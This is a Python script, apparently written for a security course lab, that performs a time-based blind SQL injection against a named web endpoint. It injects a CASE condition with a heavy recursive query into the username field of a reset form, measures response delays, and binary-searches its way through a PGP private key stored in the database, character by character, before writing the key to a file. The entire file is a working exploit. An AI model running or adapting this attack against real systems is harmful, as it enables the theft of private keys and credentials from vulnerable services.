import time
from statistics import median
import requests
from loguru import logger

API_URL = 'http://lbs-2026-00.askarov.net:3030/reset/'
API_RUNS = 100
THRESHOLD_SECONDS = 2.0  # Safe gap for differential timing

def check_payload_true(known_user, sql_payload, threshold):
    # 1. Get a Stable Baseline
    # We loop until the server responds in under 10 seconds to ensure we aren't
    # testing against a massive queue which causes False Positives.
    baseline_time = 10  # Start high to enter loop
    retries = 0
    
    while baseline_time > 0.35:  # If baseline is above 350ms, we consider the server congeste
        if retries > 0:
            logger.warning(f"⚠️ Server congested (Lag: {baseline_time:.2f}s). Retrying for stable baseline...")
            time.sleep(10) # Let the server breathe for a moment
            
        baseline_time = measure_response_time(API_URL, known_user)
        retries += 1
        


    # 2. Measure the Injection Time
    injection_time = measure_response_time(API_URL, sql_payload)
    
    # 3. Calculate the ACTUAL delay caused by SQL (Injection - Baseline)
    actual_delay = injection_time - baseline_time
    
    boolean_result = actual_delay > threshold
    # Debugging
    logger.debug(f"Base: {baseline_time:.2f}s | Inj: {injection_time:.2f}s | Diff: {actual_delay:.2f}s |boolean: {boolean_result}")

    # If the difference is significant (> 2.0s), it's a TRUE
    return boolean_result


def build_sql_payload(condition):
    return {
        "username": "admin' AND (CASE WHEN (" + condition + ") THEN (SELECT sum(x) FROM (WITH RECURSIVE cnt(x) AS (VALUES(1) UNION ALL SELECT x+1 FROM cnt WHERE x<8000000) SELECT x FROM cnt)) ELSE 0 END) like '1"}

# def measure_average_response_time(url, input):
#     request_times = []
#     for run in range(API_RUNS):
#         start = time.perf_counter()
#         r = requests.post(f"{url}", data=input)
#         end = time.perf_counter()
#         request_times.append(end - start)
#     avg_reponse_time = median(request_times)
#     logger.info(f"Run Average Time: {avg_reponse_time} for input: {input} \n")
#     return avg_reponse_time

def measure_response_time(url, input):
    start = time.perf_counter()
    r = requests.post(f"{url}", data=input)
    end = time.perf_counter()
    reponse_time = end - start
    return reponse_time

def discover_char(known_user, key_index):
    low, high = 32, 126  # ASCII printable range
    # Binary search to find the character at key_index
    while low <= high:
        mid = (low + high) // 2
        condition = f"substr(key,{key_index + 1},1)>'{chr(mid)}'"
        sql_payload = build_sql_payload(condition)
        
        # Pass average_reponse_time (ignored inside, but kept for signature compatibility)
        char_is_higher = check_payload_true(known_user, sql_payload, THRESHOLD_SECONDS)

        if char_is_higher:
            low = mid + 1
        else:
            high = mid - 1
    
    return chr(low)

def sql_injection_attack():
    logger.info(f"Starting SQL Injection Attack against the API at {API_URL}")
    #logger.info("Measuring average response time for known user...")
    known_user = {"username": "admin"}
  
    prefix = "-----BEGIN PGP PRIVATE KEY BLOCK-----"
    suffix = "-----END PGP PRIVATE KEY BLOCK-----"
    
    # We still calculate this for logging, though check_payload_true calculates its own baseline now
    #average_response_time = measure_average_response_time(API_URL, known_user)
    
    prefix_payload = build_sql_payload(f"substr(key,1,{len(prefix)})='{prefix}'")
    logger.info("Checking if the key starts with the expected PGP header...")
    if (check_payload_true(known_user, prefix_payload, THRESHOLD_SECONDS)):
        logger.info("✅ Prefix check passed")
    else:
        logger.warning("❌ Prefix check failed. The key does not start with the expected PGP header. Aborting attack.")
        exit(1)

    key = prefix
    key_index = len(prefix)  
    
    logger.info(f"🔍 Starting key extraction at index {key_index}")
    while not key.endswith(suffix):
        # Discover the character at current index
        character = discover_char(known_user, key_index)
        key = key + character
        
        key_index += 1
        
        # Log progress every 10 characters to avoid flooding the logs
        if key_index % 10 == 0:  
            logger.info(f"Progress: Extracted {key_index} characters so far...\n")
            logger.info(f"Current Key: {key}\n")

        # Safety check to prevent infinite loop in case of unexpected issues
        if len(key) > 5000:
            logger.warning("Stopping: Key exceeded 5000 characters without finding suffix.")
            break

    logger.info(f"Key extraction completed. Final key:\n{key}\n")
    file_path = "extracted_key.txt"
    logger.info(f"Saving key to {file_path}...")
    with open(file_path, "w") as f:
        f.write(key)
    logger.info(f"✅ Key saved to {file_path}")

if __name__ == '__main__':
    sql_injection_attack()